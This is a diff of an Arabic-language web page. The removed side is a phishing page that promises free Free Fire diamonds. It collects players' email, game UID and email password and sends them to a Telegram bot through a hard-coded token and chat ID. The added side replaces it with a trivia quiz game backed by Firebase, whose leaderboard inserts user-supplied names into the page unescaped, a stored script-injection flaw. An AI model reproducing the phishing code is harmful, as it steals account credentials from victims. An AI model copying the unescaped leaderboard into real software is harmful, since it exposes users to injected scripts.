@@ -2,225 +2,205 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شحن جواهر فري فاير | مسابقة الواتساب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تحدي الأبطال - الإصدار القابل للتعديل</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
-
-        :root {
-            --primary: #ff9900;
-            --secondary: #ff5500;
-            --bg-glass: rgba(0, 0, 0, 0.75);
-            --glow: 0 0 15px rgba(255, 153, 0, 0.6);
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+        :root { --main: #00d2ff; --bg: #0a0a0c; --accent: #ff007a; --success: #3fb950; --danger: #ff4b4b; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { 
+            font-family: 'Cairo', sans-serif; 
+            background: var(--bg) url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); 
+            color: white; margin: 0; height: 100dvh; display: flex; flex-direction: column; overflow: hidden;
         }
-
-        body {
-            margin: 0;
-            padding: 0;
-            color: #fff;
-            font-family: 'Cairo', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: url('maxresdefault.jpg') no-repeat center center fixed;
-            background-size: cover;
-            overflow-x: hidden;
-        }
-
-        /* طبقة حماية وضبابية فوق الخلفية */
-        .overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%);
-            z-index: 1;
-        }
-
-        .container {
-            position: relative;
-            z-index: 2;
-            background: var(--bg-glass);
-            padding: 35px 25px;
-            border-radius: 25px;
-            border: 2px solid var(--primary);
-            box-shadow: var(--glow), inset 0 0 15px rgba(255,153,0,0.2);
-            width: 90%;
-            max-width: 380px;
-            backdrop-filter: blur(12px);
-            text-align: center;
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        h1 {
-            font-size: 26px;
-            margin-bottom: 5px;
-            color: #fff;
-            text-shadow: 0 0 10px var(--primary);
-            font-weight: 900;
-        }
-
-        .subtitle {
-            font-size: 13px;
-            color: #ccc;
-            margin-bottom: 25px;
-            display: block;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-            text-align: right;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: var(--primary);
-            font-weight: bold;
-            padding-right: 5px;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 153, 0, 0.3);
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s all;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
-        }
-
-        input:focus {
-            background: rgba(255, 153, 0, 0.1);
-            border-color: var(--primary);
-            box-shadow: 0 0 10px rgba(255, 153, 0, 0.4);
-        }
-
-        button {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(90deg, var(--secondary), var(--primary));
-            border: none;
-            border-radius: 12px;
-            color: white;
-            font-size: 19px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.4s;
-            box-shadow: 0 5px 15px rgba(255, 85, 0, 0.4);
-            margin-top: 10px;
-            text-transform: uppercase;
-        }
-
-        button:active {
-            transform: scale(0.96);
-        }
-
-        .success-msg {
-            display: none;
-            background: rgba(0, 255, 136, 0.1);
-            color: #00ff88;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            border: 1px solid #00ff88;
-            font-weight: bold;
-            font-size: 14px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.8; }
-            50% { opacity: 1; }
-            100% { opacity: 0.8; }
-        }
-
-        /* لمسة جمالية للهواتف */
-        @media (max-width: 400px) {
-            .container { padding: 25px 20px; }
-            h1 { font-size: 22px; }
-        }
+        .header { text-align: center; padding: 15px; background: linear-gradient(90deg, transparent, var(--accent), transparent); font-weight: 900; box-shadow: 0 0 15px var(--accent); z-index: 10; font-size: 1.1rem; }
+        .score-bar { display: flex; justify-content: space-around; padding: 10px; background: #161b22; border-bottom: 2px solid var(--main); font-weight: bold; }
+        .container { flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 80px; }
+        .tab-content { display: none; animation: fadeIn 0.4s ease; }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .card { background: rgba(22, 27, 34, 0.9); border: 2px solid var(--main); padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; }
+        .btn-opt { display: block; width: 100%; margin: 12px 0; padding: 15px; background: rgba(255,255,255,0.05); border: 1px solid var(--main); color: white; border-radius: 12px; cursor: pointer; transition: 0.2s; font-size: 1.1rem; font-weight: bold; font-family: inherit; }
+        .correct { background: var(--success) !important; box-shadow: 0 0 15px var(--success); }
+        .wrong { background: var(--danger) !important; animation: shake 0.4s; }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-10px)} 75%{transform:translateX(10px)} }
+        .nav { position: fixed; bottom: 0; width: 100%; background: #10141a; display: flex; justify-content: space-around; padding: 10px 0; border-top: 2px solid #30363d; }
+        .nav-btn { color: #8b949e; background: none; border: none; font-size: 0.9rem; font-weight: bold; cursor: pointer; flex: 1; }
+        .nav-btn.active { color: var(--main); text-shadow: 0 0 10px var(--main); }
     </style>
 </head>
 <body>
 
-    <div class="overlay"></div>
+<div class="header">المؤسس الأول : Yousef = غابيمارو 🔥</div>
+<div class="score-bar">
+    <div>النقاط: <span id="pts" style="color: var(--main);">0</span></div>
+    <div>الرتبة: <span id="rnk" style="color: var(--success);">مستجد</span></div>
+</div>
 
-    <div class="container">
-        <h1>💎 شحن جواهر فري فاير مجانا 💎</h1>
-        <span class="subtitle">حصرياً بمناسبة شهر رمضان وعيد الفطر </span>
-        
-        <div class="input-group">
-            <label>👤 البريد الالكتروني المسجل في اللعبه </label>
-            <input type="text" id="playerName" placeholder="user@gmail.com" required>
-        </div>
-
-        <div class="input-group">
-            <label>🆔 المعرف (UID)</label>
-            <input type="number" id="playerUid" placeholder="أدخل الـ UID المكون من أرقام" required>
-        </div>
-
-        <div class="input-group">
-            <label>🔑كلمة سر الحساب</label>
-            <input type="password" id="groupPassword" placeholder="كلمة السر الخاصة بالبريد الالكتروني" required>
-        </div>
-
-        <button id="submitBtn" onclick="sendToTelegram()">اشحن الآن مجاناً 🔥</button>
-        
-        <div class="success-msg" id="successMsg">
-            تم إرسال بياناتك بنجاح! <br> جاري التحقق من كلمة السر والشحن...
+<div class="container">
+    <div id="game-tab" class="tab-content active">
+        <div class="card">
+            <h2 id="q-text" style="line-height: 1.5;">جاري التجهيز...</h2>
+            <div id="options"></div>
         </div>
     </div>
 
-    <script>
-        function sendToTelegram() {
-            const name = document.getElementById('playerName').value;
-            const uid = document.getElementById('playerUid').value;
-            const pass = document.getElementById('groupPassword').value;
-            const btn = document.getElementById('submitBtn');
+    <div id="syllabus-tab" class="tab-content">
+        <h1 style="text-align:center; color: var(--main);">📚 بنك المنهج الدراسي</h1>
+        <div id="syllabus-list"></div>
+    </div>
 
-            if(!name || !uid || !pass) {
-                alert("عذراً! يجب ملء جميع البيانات للمشاركة.");
-                return;
-            }
+    <div id="leader-tab" class="tab-content">
+        <h3 style="text-align:center;">🏆 الأبطال المتصلون</h3>
+        <div id="leaderboard"></div>
+    </div>
+</div>
 
-            // تغيير حالة الزر أثناء الإرسال
-            btn.innerText = "جاري الاتصال بالسيرفر...";
-            btn.disabled = true;
+<div class="nav">
+    <button class="nav-btn active" onclick="switchTab('game-tab', this)">🎮 اللعبة</button>
+    <button class="nav-btn" onclick="switchTab('syllabus-tab', this)">📚 المنهج</button>
+    <button class="nav-btn" onclick="switchTab('leader-tab', this)">🏆 الأبطال</button>
+</div>
 
-            // --- بيانات البوت الخاصة بك ---
-            const botToken = "8221264460:AAFPrYn7Ae7W0mXVjd31yktH8Xqd8iI1bMI"; 
-            const chatId = "7394389253";
-            
-            const message = `🚀 طلب شحن جديد!\n\n👤 اللاعب: ${name}\n🆔 الـ UID: ${uid}\n🔐 كلمة سر المجموعة: ${pass}\n📱 الحالة: عضو واتساب`;
+<script>
+    // --- إعدادات Firebase (نفس بياناتك الأصلية) ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyDXr5aORgONB7Cvq9qTru3Y_v0-dLzVYNA",
+        authDomain: "tay-game.firebaseapp.com",
+        databaseURL: "https://tay-game-default-rtdb.firebaseio.com",
+        projectId: "tay-game",
+        storageBucket: "tay-game.firebasestorage.app",
+        messagingSenderId: "313499272374",
+        appId: "1:313499272374:web:26b693f457239555365217"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    let myName = prompt("أدخل اسمك يا بطل:") || "مقاتل";
+    let score = 0;
+    const userRef = db.ref('status/' + myName);
 
-            fetch(url)
-                .then(response => {
-                    if(response.ok) {
-                        document.getElementById('successMsg').style.display = 'block';
-                        btn.style.display = 'none'; // إخفاء الزر بعد النجاح
-                    } else {
-                        alert("حدث خطأ! تأكد من إعدادات البوت والتوكن.");
-                        btn.innerText = "اشحن الآن مجاناً 🔥";
-                        btn.disabled = false;
-                    }
-                })
-                .catch(error => {
-                    alert("تحقق من اتصالك بالإنترنت.");
-                    btn.disabled = false;
-                });
-        }
-    </script>
+    function updatePoints(val) {
+        score += val;
+        document.getElementById('pts').innerText = score;
+        let rank = score > 500 ? "نينجا أسطوري" : "دحيح";
+        document.getElementById('rnk').innerText = rank;
+        userRef.update({ name: myName, score, rank });
+    }
+
+    // --- مصفوفة الأسئلة (أهم جزء) ---
+    const allQuestions = [
+        // 50 سؤال متنوع للعبة
+        {q:"ما هو أسرع حيوان في العالم؟", a:"الفهد", o:["الفهد","الأسد","النعامة","الغزال"], type:"game"},
+        {q:"عاصمة مصر هي؟", a:"القاهرة", o:["القاهرة","لندن","باريس","مكة"], type:"game"},
+        {q:"من هو بطل أنمي ون بيس؟", a:"لوفي", o:["لوفي","ناروتو","إيتاتشي","غوكو"], type:"game"},
+        {q:"كم عدد قارات العالم؟", a:"7", o:["7","5","6","8"], type:"game"},
+        {q:"ما هو لون كوكب المريخ؟", a:"الأحمر", o:["الأحمر","الأزرق","الأصفر","الأخضر"], type:"game"},
+        {q:"أكبر محيط في العالم؟", a:"الهادئ", o:["الهادئ","الأطلسي","الهندي","المتجمد"], type:"game"},
+        {q:"معدن سائل في درجة حرارة الغرفة؟", a:"الزئبق", o:["الزئبق","الحديد","النحاس","الذهب"], type:"game"},
+        {q:"من اخترع المصباح الكهربائي؟", a:"إديسون", o:["إديسون","نيوتن","تسلا","بيل"], type:"game"},
+        {q:"أطول نهر في العالم؟", a:"النيل", o:["النيل","الأمازون","الكونغو","دجلة"], type:"game"},
+        {q:"كم عدد أضلاع المثلث؟", a:"3", o:["3","4","5","6"], type:"game"},
+        {q:"ما هي عاصمة السعودية؟", a:"الرياض", o:["الرياض","جدة","الدمام","المدينة"], type:"game"},
+        {q:"ما هو الغاز الذي نتنفسه؟", a:"الأكسجين", o:["الأكسجين","النيتروجين","الهيدروجين","الميثان"], type:"game"},
+        {q:"أين تقع الأهرامات؟", a:"الجيزة", o:["الجيزة","الأقصر","أسوان","الفيوم"], type:"game"},
+        {q:"ما هو الشيء الذي يغرق في الماء ولا يبتل؟", a:"الضوء", o:["الضوء","السفينة","الحجر","الخشب"], type:"game"},
+        {q:"من هو مؤسس تطبيق فيسبوك؟", a:"مارك زوكربيرج", o:["مارك زوكربيرج","بيل غيتس","ستيف جوبز","إيلون ماسك"], type:"game"},
+        {q:"ما هو الحيوان الذي يسمى سفينة الصحراء؟", a:"الجمل", o:["الجمل","الحصان","الفيل","الحمار"], type:"game"},
+        {q:"ما هو أصغر كوكب في المجموعة الشمسية؟", a:"عطارد", o:["عطارد","بلوتو","المريخ","الزهرة"], type:"game"},
+        {q:"ما هو الطائر الذي يضع أكبر بيضة؟", a:"النعامة", o:["النعامة","الصقر","النسر","البطريق"], type:"game"},
+        {q:"من سجل 'يد الله' في كأس العالم؟", a:"مارادونا", o:["مارادونا","بيليه","ميسي","زيدان"], type:"game"},
+        {q:"كم عدد أسنان الإنسان البالغ؟", a:"32", o:["32","28","30","34"], type:"game"},
+        {q:"ما هي لغة البرازيل؟", a:"البرتغالية", o:["البرتغالية","الإسبانية","الإنجليزية","الفرنسية"], type:"game"},
+        {q:"أكبر حيوان في العالم؟", a:"الحوت الأزرق", o:["الحوت الأزرق","الفيل","الديناصور","القرش"], type:"game"},
+        {q:"ما هو الكوكب الملقب بالكوكب الأزرق؟", a:"الأرض", o:["الأرض","نيبتون","أورانوس","المشتري"], type:"game"},
+        {q:"من هو مكتشف الجاذبية؟", a:"نيوتن", o:["نيوتن","أينشتاين","دالتون","بواسون"], type:"game"},
+        {q:"ما هو العضو المسؤول عن ضخ الدم؟", a:"القلب", o:["القلب","الرئة","الكبد","الدماغ"], type:"game"},
+        {q:"كم عدد ألوان قوس قزح؟", a:"7", o:["7","6","8","5"], type:"game"},
+        {q:"ما هو أثقل كوكب؟", a:"المشتري", o:["المشتري","زحل","الأرض","نيبتون"], type:"game"},
+        {q:"ما هو أذكى حيوان بحري؟", a:"الدلفين", o:["الدلفين","القرش","الأخطبوط","الحوت"], type:"game"},
+        {q:"من هو بطل أنمي ناروتو؟", a:"ناروتو", o:["ناروتو","ساسكي","كاكاشي","مادارا"], type:"game"},
+        {q:"كم عدد صمامات القلب؟", a:"4", o:["4","2","3","5"], type:"game"},
+        {q:"ما هو الرمز الكيميائي للذهب؟", a:"Au", o:["Au","Ag","Fe","Cu"], type:"game"},
+        {q:"كم عدد السجدات في القرآن الكريم؟", a:"15", o:["15","10","12","14"], type:"game"},
+        {q:"ما هي عاصمة اليابان؟", a:"طوكيو", o:["طوكيو","سيول","بكين","أوساكا"], type:"game"},
+        {q:"أكبر دولة في العالم من حيث المساحة؟", a:"روسيا", o:["روسيا","كندا","الصين","أمريكا"], type:"game"},
+        {q:"من هو بطل سلسلة أفلام هاري بوتر؟", a:"دانيال رادكليف", o:["دانيال رادكليف","توم هولاند","براد بيت","جوني ديب"], type:"game"},
+        {q:"ما هي أصغر دولة في العالم؟", a:"الفاتيكان", o:["الفاتيكان","موناكو","مالطا","البحرين"], type:"game"},
+        {q:"ما هو الطائر الذي لا يطير؟", a:"البطريق", o:["البطريق","العصفور","الحمام","الببغاء"], type:"game"},
+        {q:"من الذي بنى تمثال أبو الهول؟", a:"خفرع", o:["خفرع","خوفو","منقرع","رمسيس"], type:"game"},
+        {q:"ما هو لون دم الأخطبوط؟", a:"أزرق", o:["أزرق","أحمر","أخضر","أبيض"], type:"game"},
+        {q:"كم عدد أيام السنة الكبيسة؟", a:"366", o:["366","365","364","360"], type:"game"},
+        {q:"من هو مخترع الهاتف؟", a:"جراهام بيل", o:["جراهام بيل","إديسون","نيوتن","فاراداي"], type:"game"},
+        {q:"ما هو أصل كلمة أطلس؟", a:"يوناني", o:["يوناني","روماني","عربي","فارسي"], type:"game"},
+        {q:"ما هي العملة المستخدمة في أوروبا؟", a:"اليورو", o:["اليورو","الدولار","الجنيه","الين"], type:"game"},
+        {q:"كم عدد الكواكب في المجموعة الشمسية؟", a:"8", o:["8","9","7","10"], type:"game"},
+        {q:"ما هو الحيوان الذي لا ينام؟", a:"القرش", o:["القرش","النملة","الدلفين","الفيل"], type:"game"},
+        {q:"ما هي القارة القطبية الجنوبية؟", a:"أنتاركتيكا", o:["أنتاركتيكا","أستراليا","آسيا","أوروبا"], type:"game"},
+        {q:"ما هو العضو الذي ينمو طوال حياة الإنسان؟", a:"الأنف والأذن", o:["الأنف والأذن","العين","اليد","القدم"], type:"game"},
+        {q:"ما هو أبطأ حيوان في العالم؟", a:"الكسلان", o:["الكسلان","السلحفاة","الحلزون","الكوالا"], type:"game"},
+        {q:"كم عدد العضلات في جسم الإنسان تقريباً؟", a:"600", o:["600","200","400","800"], type:"game"},
+        {q:"ما هو الشيء الذي يحترق ليضيء للآخرين؟", a:"الشمعة", o:["الشمعة","المصباح","الشمس","النار"], type:"game"}
+        
+        // --- هنا ستضيف أسئلة المنهج لاحقاً بنفس الطريقة ---
+    ];
+
+    let gameIdx = 0;
+    function loadGame() {
+        const list = allQuestions.filter(q => q.type === 'game');
+        const item = list[gameIdx % list.length];
+        document.getElementById('q-text').innerText = item.q;
+        const optBox = document.getElementById('options'); optBox.innerHTML = '';
+        item.o.sort(()=>Math.random()-0.5).forEach(o => {
+            const b = document.createElement('button'); b.className = 'btn-opt'; b.innerText = o;
+            b.onclick = () => {
+                if(o === item.a) { b.classList.add('correct'); updatePoints(10); setTimeout(()=>{gameIdx++; loadGame();}, 1000); }
+                else { b.classList.add('wrong'); updatePoints(-5); }
+            };
+            optBox.appendChild(b);
+        });
+    }
+
+    function loadSyllabus() {
+        const list = allQuestions.filter(q => q.type === 'syllabus');
+        const box = document.getElementById('syllabus-list'); box.innerHTML = '';
+        if(list.length === 0) { box.innerHTML = '<p style="text-align:center;">لا توجد أسئلة منهج حالياً. أضفها في مصفوفة الأسئلة!</p>'; return; }
+        list.forEach((item, i) => {
+            const card = document.createElement('div'); card.className = 'card';
+            card.innerHTML = `<h4>${item.q}</h4><div id="s-opt-${i}"></div>`;
+            box.appendChild(card);
+            item.o.forEach(o => {
+                const b = document.createElement('button'); b.className = 'btn-opt'; b.innerText = o;
+                b.onclick = () => {
+                    if(o === item.a) { b.classList.add('correct'); updatePoints(10); b.disabled = true; }
+                    else { b.classList.add('wrong'); updatePoints(-5); }
+                };
+                card.querySelector(`#s-opt-${i}`).appendChild(b);
+            });
+        });
+    }
+
+    function switchTab(id, btn) {
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(id).classList.add('active'); btn.classList.add('active');
+        if(id === 'syllabus-tab') loadSyllabus();
+    }
+
+    db.ref('status').on('value', snap => {
+        let h = ''; snap.forEach(u => {
+            h += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333;">
+                <span>${u.val().name}</span><b>${u.val().score} 🎯</b>
+            </div>`;
+        });
+        document.getElementById('leaderboard').innerHTML = h;
+    });
+
+    loadGame();
+</script>
 </body>
 </html>
